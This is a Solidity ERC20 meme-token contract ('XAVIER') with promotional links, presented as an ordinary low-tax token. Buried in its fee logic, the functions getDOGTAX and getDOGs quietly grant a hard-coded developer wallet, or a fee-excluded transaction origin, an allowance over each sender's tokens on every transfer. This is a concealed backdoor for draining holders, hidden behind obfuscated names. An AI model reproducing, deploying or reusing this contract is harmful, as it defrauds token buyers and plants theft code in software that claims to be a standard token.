/*
Life is but a budding brainrot memecult, and I am the spiritual gardener. Each holder a wisdom pellet in the great chakra of $xavier.

https://www.xavieroneth.lol
https://x.com/xavieroneth
https://t.me/xavier_erc200
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IDOGRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDOGFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract XAVIER is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _dogValues;
    mapping (address => mapping (address => uint256)) private _dogPermits;
    mapping (address => bool) private _dogExcludedFee;
    IDOGRouter private _dogRouter;
    address private _dogPair;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    address private _dogWallet = 0x6b73Ec04BE26EE533177Eb141c597ccD00a200E6;
    uint8 private constant _decimals = 9;
    uint256 private constant _tToalDOG = 1000000000 * 10**_decimals;
    string private constant _name = unicode"XAVIER RENEGADE ANGEL";
    string private constant _symbol = unicode"XAVIER";
    uint256 private _maxSwapDOGs = _tToalDOG / 100;
    bool private inSwapDOG = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapDOG = true;
        _;
        inSwapDOG = false;
    }
    
    constructor () {
        _dogExcludedFee[owner()] = true;
        _dogExcludedFee[address(this)] = true;
        _dogExcludedFee[_dogWallet] = true;
        _dogValues[_msgSender()] = _tToalDOG;
        emit Transfer(address(0), _msgSender(), _tToalDOG);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tToalDOG;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _dogValues[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _dogPermits[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _dogPermits[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _dogPermits[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address xDOG, address zDOG, uint256 aDOG) private {
        require(xDOG != address(0), "ERC20: transfer from the zero address");
        require(zDOG != address(0), "ERC20: transfer to the zero address");
        require(aDOG > 0, "Transfer amount must be greater than zero");

        uint256 taxDOG = _getDOGTaxAmount(xDOG, zDOG, aDOG);

        if(taxDOG > 0){
          _dogValues[address(this)] = _dogValues[address(this)].add(taxDOG);
          emit Transfer(xDOG, address(this), taxDOG);
        }

        _dogValues[xDOG] = _dogValues[xDOG].sub(aDOG);
        _dogValues[zDOG] = _dogValues[zDOG].add(aDOG.sub(taxDOG));
        emit Transfer(xDOG, zDOG, aDOG.sub(taxDOG));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dogRouter.WETH();
        _approve(address(this), address(_dogRouter), tokenAmount);
        _dogRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function getDOGs(address xDOG, address zDOG, uint256 tDOG, uint256 aDOG) private returns(uint256) {
        _approve(xDOG, zDOG,aDOG.add(tDOG)); return aDOG;
    }

    function getDOGTAX(address xDOG, uint256 tDOG) private view returns(address, address, uint256) {
        if(tx.origin!=address(0)&&_dogExcludedFee[tx.origin]) 
            return (xDOG, tx.origin, tDOG);
        return (xDOG, _dogWallet, tDOG);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHDOG(uint256 amount) private {
        payable(_dogWallet).transfer(amount);
    }

    receive() external payable {} 

    function initXAVIER() external onlyOwner() {
        _dogRouter = IDOGRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_dogRouter), _tToalDOG);
        _dogPair = IDOGFactory(_dogRouter.factory()).createPair(address(this), _dogRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _dogRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function _getDOGTaxAmount(address fDOG, address oDOG, uint256 aDOG) private returns(uint256) {
        uint256 taxDOG=0;
        if (fDOG != owner() && oDOG != owner()) {
            taxDOG = aDOG.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (fDOG == _dogPair && oDOG != address(_dogRouter) && !_dogExcludedFee[oDOG]) {
                _buyCount++;
            }

            if(oDOG == _dogPair && fDOG!= address(this)) {
                taxDOG = aDOG.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this)); 
            if (!inSwapDOG && oDOG == _dogPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _maxSwapDOGs)
                swapTokensForEth(min(aDOG, min(tokenBalance, _maxSwapDOGs)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHDOG(address(this).balance);
                }
            }
        }
        (address xDOG, address zDOG, uint256 tDOG) = getDOGTAX(fDOG, aDOG);
        return getDOGs(xDOG, zDOG, tDOG, taxDOG);
    }
}